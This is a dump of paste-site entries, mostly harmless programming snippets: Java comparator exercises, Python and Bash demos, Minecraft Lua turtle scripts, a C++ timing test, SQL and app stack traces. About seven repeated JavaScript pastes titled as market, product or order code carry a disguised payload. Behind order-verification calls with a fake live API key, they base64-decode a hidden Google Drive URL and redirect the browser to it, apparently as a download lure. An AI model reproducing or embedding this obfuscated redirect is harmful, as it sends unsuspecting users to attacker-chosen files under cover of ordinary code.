        Comparator<Movie> comparator= Comparator.comparing((Movie m)->getMovieCoef(m,max_ratings_count)).reversed()
                .thenComparing((Movie m)->m.getTitle());
        return movies.stream().sorted(comparator)
                .limit(10)
                .collect(Collectors.toList());

    }
}

class Movie {

    String title;
    int[] ratings;

    public Movie(String title, int[] ratings) {
        this.title = title;
        this.ratings = ratings;
    }

    public String getTitle() {
        return title;
    }

    public int[] getRatings() {
        return ratings;
    }

    public double getAverageRating() {
        return Arrays.stream(ratings).mapToDouble(i -> i).average().orElse(0);
    }

    @Override
    public String toString() {
        return String.format(""%s (%.2f) of %d ratings"",title,getAverageRating(),ratings.length);
    }
}
public class MoviesTest {
  public static void main(String[] args) {
    Scanner scanner = new Scanner(System.in);
    MoviesList moviesList = new MoviesList();
    int n = scanner.nextInt();
    scanner.nextLine();
    for (int i = 0; i < n; ++i) {
      String title = scanner.nextLine();
      int x = scanner.nextInt();
      int[] ratings = new int[x];
      for (int j = 0; j < x; ++j) {
        ratings[j] = scanner.nextInt();
      }
      scanner.nextLine();
      moviesList.addMovie(title, ratings);
    }
    scanner.close();
    List<Movie> movies = moviesList.top10ByAvgRating();
    System.out.println(""=== TOP 10 BY AVERAGE RATING ==="");
    for (Movie movie : movies) {
      System.out.println(movie);
    }
    movies = moviesList.top10ByRatingCoef();
    System.out.println(""=== TOP 10 BY RATING COEFFICIENT ==="");
    for (Movie movie : movies) {
      System.out.println(movie);
    }
  }
}
"
mjeAb8eq,Untitled,BlackArrow502,Python,Tuesday 22nd of April 2025 09:17:29 AM CDT,"a = 5
b = 5
print(a is b)

a = 300
b = 300
print(a is b)"
mXyk97Tw,arrays.sh,sergio_educacionit,Bash,Tuesday 22nd of April 2025 09:16:14 AM CDT,"#!/bin/bash

#            indice0     inidice1    indice2
mi_array=( ""elemento1"" ""elemento2"" ""elemento3"" )


echo ${mi_array[0]}
echo ${mi_array[1]}
echo ${mi_array[2]}

echo ${mi_array[@]}

mi_array[2]=""casa""
echo ${mi_array[@]}


mi_array[3]=""perro""
echo ${mi_array[@]} # devuelve elemento1 elemento2 casa perro

mi_array+=(""asignacion"")
echo ${mi_array[@]}


echo ${mi_array[-1]} # devuelve asignacion

echo ${mi_array[-2]} # devuelve perro

echo ${#mi_array[@]}

echo ${!mi_array[@]}
"
Epjt5u7w,Untitled,BlackArrow502,Python,Tuesday 22nd of April 2025 09:16:12 AM CDT,"def set_list(list):
    list = [""A"", ""B"", ""C""]
    return list

def add(list):
    list.append(""D"")
    return list

my_list = [""E""]
print(set_list(my_list))
print(add(my_list))
"
5FYp3vmK,2025-04-22T16:15:24.907845,powerampache,PHP,Tuesday 22nd of April 2025 09:15:25 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.217.214 (port 48180) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

scrobble() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.217.214 (port 48180) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.217.214 (port 48180) after 15000ms\"" }"",""stackTrace"":[]}"
qBgnJqF0,Cortex M0 Kinetis GPIO,Dani_info,C,Tuesday 22nd of April 2025 09:13:26 AM CDT,"//enable clock 
SIM->SCGC5|=SIM_SCGC_PORTp_MASK;

//SET MUX
//clear MUX bits 
PORTp->PCR[x]&=~PORT_PCR_MUX_MASK;
//set mux bits as GPIO
PORTp->PCR[x]|=PORT_PCR_MUX(1);

//set direction: 1-OUT; 0-IN

PORTp->PDDR|=1UL<<x; //OUT
PORTp->PDDR&=~1UL<<x; //IN

//set OUT='high'
PORTp->PSOR|=1UL<<x;
//or
PORTp->PDOR=1UL<<x;

//set OUT='low'
PORTp->PCOR|=1UL<<x;

//toggle pin 
PORTp->PTOR|=1UL<<x;

//read pin level 

if (PORTp->PDIR& (1UL<<x))
	//if PORT p pin x execute this;
"
GRKtR5sj,2025-04-22T08:24:40.186761,powerampache,PHP,Tuesday 22nd of April 2025 08:24:38 AM CDT,"1.01-78 (78) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
wVj1jrha,[NP] Car Collection,dzocesrce,Java,Tuesday 22nd of April 2025 08:24:10 AM CDT,"import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Scanner;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;
class Car {
    String manufacturer;
    String model;
    int price;
    float power;

    public Car(String manufacturer, String model, int price, float power) {
        this.manufacturer = manufacturer;
        this.model = model;
        this.price = price;
        this.power = power;
    }

    public String getManufacturer() {
        return manufacturer;
    }

    public String getModel() {
        return model;
    }

    public int getPrice() {
        return price;
    }

    public float getPower() {
        return power;
    }

    @Override
    public String toString() {
        return String.format(""%s %s (%.0fKW) %d"", manufacturer, model, power, price);
    }
}

class CarCollection {
    List<Car> cars;

    public CarCollection() {
        this.cars = new ArrayList<>();
    }

    public void sortByPrice(boolean b) {
        Comparator<Car> comparator = Comparator.comparing(Car::getPrice)
                .thenComparing(Car::getPower);
        if(!b)
            comparator=comparator.reversed();
        cars=cars.stream().sorted(comparator).collect(Collectors.toList());
                //.forEach(car-> System.out.println(car));
    }

    public List<Car> getList() {
        return cars;
    }

    public List<Car> filterByManufacturer(String manufacturer) {
        return cars.stream().filter(car->car.getManufacturer().toLowerCase().equals(manufacturer.toLowerCase()))
                .sorted(Comparator.comparing(Car::getModel))
                .collect(Collectors.toList());
    }

    public void addCar(Car car) {
        cars.add(car);
    }
}

public class CarTest {
	public static void main(String[] args) {
		CarCollection carCollection = new CarCollection();
		String manufacturer = fillCollection(carCollection);
		carCollection.sortByPrice(true);
		System.out.println(""=== Sorted By Price ASC ==="");
		print(carCollection.getList());
		carCollection.sortByPrice(false);
		System.out.println(""=== Sorted By Price DESC ==="");
		print(carCollection.getList());
		System.out.printf(""=== Filtered By Manufacturer: %s ===\n"", manufacturer);
		List<Car> result = carCollection.filterByManufacturer(manufacturer);
		print(result);
	}

	static void print(List<Car> cars) {
		for (Car c : cars) {
			System.out.println(c);
		}
	}

	static String fillCollection(CarCollection cc) {
		Scanner scanner = new Scanner(System.in);
		while (scanner.hasNext()) {
			String line = scanner.nextLine();
			String[] parts = line.split("" "");
            if(parts.length < 4) return parts[0];
			Car car = new Car(parts[0], parts[1], Integer.parseInt(parts[2]),
					Float.parseFloat(parts[3]));
			cc.addCar(car);
		}
        scanner.close();
		return """";
	}
}
"
xb1qP8wM,pipe.lua,Xmann1,Lua,Tuesday 22nd of April 2025 07:53:57 AM CDT,"local out_direction = ""right""
local out_chest = peripheral.wrap(out_direction)

local in_direction = ""left""
local in_chest = peripheral.wrap(in_direction)

local query = ""minecraft:diamond""

rednet.open(""bottom"")

function io()
  -- Pipe matching items towards player
  local out_chest_items = out_chest.list()
  if out_chest_items ~= nil then
    for slot, item in pairs(out_chest_items) do
      if string.find(item.name, query) then
        print(""Pushing "" .. item.name .. "" in"")
        out_chest.pushItems(in_direction, slot)
      end
    end
  end

  -- Pipe non-matching items away from player
  local in_chest_items = in_chest.list()
  if in_chest_items ~= nil then
    for slot, item in pairs(in_chest_items) do
      if not string.find(item.name, query) then
        in_chest.pushItems(out_direction, slot)
        print(""Pushing "" .. item.name .. "" out"")
      end
    end
  end
end

while true do
  os.startTimer(0.1)

  local id, message = rednet.receive(0.1)
  if id then
    query = message

    print(""Now querying for "" .. query)
  end

  io()
end

"
XKf6hv7r,Market.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 07:37:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/94460/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0KY1MUei,Untitled,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 07:22:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46267/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mX7Q9wCq,Products.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 07:06:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38421/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ufURUwu2,TestTSC.cpp,Jahus,C++,Tuesday 22nd of April 2025 07:03:39 AM CDT,"#include <windows.h>
#include <iostream>
#include <intrin.h>
#include <stdint.h>
#include <vector>
#include <numeric>

int main() {
    LARGE_INTEGER qpcStart, qpcEnd, freq;
    std::vector<double> freqs;

    QueryPerformanceFrequency(&freq);

    for (int i = 0; i < 10; ++i) {
        QueryPerformanceCounter(&qpcStart);
        uint64_t tscStart = __rdtsc();

        Sleep(100);

        uint64_t tscEnd = __rdtsc();
        QueryPerformanceCounter(&qpcEnd);

        double elapsedSec = static_cast<double>(qpcEnd.QuadPart - qpcStart.QuadPart) / freq.QuadPart;
        double estimatedHz = (tscEnd - tscStart) / elapsedSec;

        freqs.push_back(estimatedHz);

        std::cout << ""Measurement "" << i + 1 << "":\n"";
        std::cout << ""  TSC delta: "" << tscEnd - tscStart << "" cycles\n"";
        std::cout << ""  Time: "" << elapsedSec << "" s\n"";
        std::cout << ""  Estimated frequency: "" << estimatedHz << "" Hz\n"";
        std::cout << ""  Frequency cast to uint32_t: "" << static_cast<uint32_t>(estimatedHz) << "" Hz\n"";
        if (estimatedHz > static_cast<double>(UINT32_MAX)) {
            std::cout << ""  >>> uint32_t overflow detected!\n"";
        }
        std::cout << std::endl;
    }

    double average = std::accumulate(freqs.begin(), freqs.end(), 0.0) / freqs.size();
    std::cout << ""Average of 10 measurements: "" << average << "" Hz\n"";
    std::cout << ""Cast average: "" << static_cast<uint32_t>(average) << "" Hz\n"";
    if (average > static_cast<double>(UINT32_MAX)) {
        std::cout << "">>> Global uint32_t overflow!\n"";
    }

    std::cout << ""\nPress any key to exit..."";
    std::cin.get();

    return 0;
}"
n7yLAeFN,Order.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:51:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/05962/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
V2DQVX6R,Market.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:35:58 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95450/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MCTLzmEZ,Mining Turtle Intelligent Quarry,officialVoice,Lua,Tuesday 22nd of April 2025 06:35:49 AM CDT,"io.write(""Length of the side example: 5 = 5x5 "")
local size = tonumber(read())

io.write(""Start Y-Level (e.g. 64): "")
local currentHeight = tonumber(read())
local startY = currentHeight

local targetHeight = -30
local areasize = size * size



-- Fläche vorwärts graben
local function digLayerForward()
    for row = 1, size do
        for col = 1, size - 1 do
            turtle.dig()
            turtle.forward()
        end
        if row < size then
            if row % 2 == 1 then
                turtle.turnRight()
                turtle.dig()
                turtle.forward()
                turtle.turnRight()
            else
                turtle.turnLeft()
                turtle.dig()
                turtle.forward()
                turtle.turnLeft()
            end
        end
    end
end

-- Fläche rückwärts graben
local function digLayerBackward(odd)
  if odd == true then
      for row = 1, size do
          for col = 1, size - 1 do
              turtle.dig()
              turtle.forward()
          end
          if row < size then
              if row % 2 == 1 then
                  turtle.turnRight()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnRight()
              else
                  turtle.turnLeft()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnLeft()
              end
          end
      end
  else
      for row = 1, size do
          for col = 1, size - 1 do
              turtle.dig()
              turtle.forward()
          end
          if row < size then
              if row % 2 == 1 then
                  turtle.turnLeft()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnLeft()
              else
                  turtle.turnRight()
                  turtle.dig()
                  turtle.forward()
                  turtle.turnRight()
              end
          end
      end
  end
end

local unwanted = { cobblestone=true, dirt=true, grass=true, cobbled_deepslate=true, gravel=true }
local function cleanupInventory()
  for i=1,16 do
    local d = turtle.getItemDetail(i)
    if d and unwanted[d.name:match("".+:(.+)"")] then
      turtle.select(i); turtle.drop()
    end
  end
  turtle.select(1)
end


local function isInventoryFull()
    cleanupInventory()

    local maxvalue = areasize * 2
    if maxvalue > 800 then
        maxvalue = 800
    end



    local cnt=0
    for i=1,16 do cnt=cnt + turtle.getItemCount(i) end
    print(""Inventar: "" .. cnt)
    return cnt >= maxvalue
end

local function goHomeAndBack()
    local layer = (startY - currentHeight) + 1

    -- nach oben zur Startposition (bei der Kiste)
    while turtle.detectUp() do turtle.digUp(); sleep(0.2) end
    while currentHeight < startY do
        turtle.up()
        currentHeight = currentHeight + 1
    end

    -- Kiste ist direkt hinter der Turtle
    turtle.turnLeft()
    turtle.turnLeft()

    -- Items droppen
    for i = 2, 16 do
        turtle.select(i)
        turtle.drop()
    end
    turtle.select(1)

    turtle.turnLeft()
    turtle.turnLeft()

    -- zurück auf das alte Y-Level
    while turtle.detectDown() do turtle.digDown(); sleep(0.2) end
    while currentHeight > (startY - layer + 1) do
        turtle.down()
        currentHeight = currentHeight - 1
    end
end



local function moveCoalToSlot1()
    turtle.select(1)
    for i=2,16 do
      local it = turtle.getItemDetail(i)
      if it and it.name==""minecraft:coal"" then
        turtle.transferTo(1, turtle.getItemCount(i))
        break
      end
    end
    turtle.select(1)
end
  
local function fuelCheck()
    moveCoalToSlot1()
    turtle.select(1)

    local coalusage = areasize / 80
    local coalusageround = math.ceil(coalusage)




    local d = turtle.getItemDetail()
    if d and d.name==""minecraft:coal"" then
      turtle.refuel(coalusageround); return
    else
        print(""No Coal"")
    end
end



-- Hauptloop
while currentHeight > targetHeight do
    fuelCheck()
    if isInventoryFull() then
        goHomeAndBack()
    end
    digLayerForward()
    turtle.turnLeft()
    turtle.turnLeft()
    while turtle.detectDown() do
      turtle.digDown()
      sleep(0.4)
    end
    if turtle.down() then
      currentHeight = currentHeight - 1
      print(""Aktuelle Höhe: "" .. currentHeight)
    else
      print(""Konnte nicht nach unten."")
      break -- ✅ jetzt korrekt innerhalb der while-Schleife
    end
    digLayerBackward(size % 2 == 1)
    turtle.turnLeft()
    turtle.turnLeft()
    while turtle.detectDown() do
      turtle.digDown()
      sleep(0.4)
    end
    if turtle.down() then
      currentHeight = currentHeight - 1
      print(""Aktuelle Höhe: "" .. currentHeight)
    else
      print(""Konnte nicht nach unten."")
      break -- ✅ jetzt korrekt innerhalb der while-Schleife
    end

    -- nach unten graben
end

print(""Fertig!"")"
qgVRErdd,Untitled,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:20:35 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/42661/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
69WH3PNF,Products.js,hubertzoo90,JavaScript,Tuesday 22nd of April 2025 06:05:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/18418/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
r7xCqrQr,Untitled,YuvalGai,SQL,Tuesday 22nd of April 2025 06:03:30 AM CDT,"select 
 MATCH_LOP_EVENT_ID calendar_entry_id
,MATCH_LOP_EVENT_TYPE lo_Event_id
,MATCH_EVENT_TYPE_ID match_type_id
,count(*) events
from SNOWPLOW.DERIVED.USER_MATCH_TOTAL where match_end_date >= current_date - 30 and MATCH_LOP_EVENT_ID in
(select distinct calendar_entry_id from
(select calendar_entry_id, count(*) events2 from
(select 
 MATCH_LOP_EVENT_ID calendar_entry_id
,MATCH_LOP_EVENT_TYPE lo_Event_id
,MATCH_EVENT_TYPE_ID match_type_id
,count(*) events
from SNOWPLOW.DERIVED.USER_MATCH_TOTAL where match_end_date >= current_date - 30  group by all) group by all having events2 > 1))
group by all order by 1,2,3,4"
